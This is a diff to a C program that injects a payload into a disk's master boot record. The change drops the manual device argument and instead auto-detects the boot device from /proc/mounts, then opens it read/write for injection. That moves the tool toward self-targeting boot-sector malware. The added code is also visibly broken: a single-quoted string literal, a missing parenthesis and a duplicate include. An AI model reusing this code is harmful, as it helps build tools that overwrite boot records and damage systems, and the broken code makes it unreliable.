@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <string.h>
+#include <mntent.h>
+#include <string.h>
 
 #define SECTOR_SIZE 512
 #define BOOT_SIGNATURE "\x55\xAA"
@@ -15,17 +17,29 @@ int main(int argc, char *argv[]) {
 	char payload[MAX_PAYLOAD_LEN];
 	int payloadlen;
 	unsigned int newMBROffset;
-
-	if (argc != 2) {
-		printf("Usage: '%s DEVICE'\n", argv[0]);
+	struct mntent *mnt;
+	FILE *mntBase;
+	char *targetDev = NULL;
+	
+	//Auto-detect the boot device
+	mntBase = setmntent("/proc/mounts", "r");
+	if(mntBase == NULL) {
 		return 1;
 	}
 	
-	printf("Injecting to %s\n", argv[1]);
+	while(NULL != (mnt = getmntent(mntBase)) {
+		if(strstr(mnt->mnt_dir, '/boot') != NULL) {
+			targetDev = mnt->mnt_fsname;
+		} 
+	}
 	
-	fp = fopen(argv[1], "r+");
+	endmntent(mntBase);
+	
+	printf("Injecting to %s\n", targetDev);
+	
+	fp = fopen(targetDev, "r+");
 	if (fp == NULL) {
-		printf("Could not open %s for read/write. Are you sure you have permission?\n", argv[1]);
+		printf("Could not open %s for read/write. Are you sure you have permission?\n", targetDev);
 		return 1;
 	}
 	
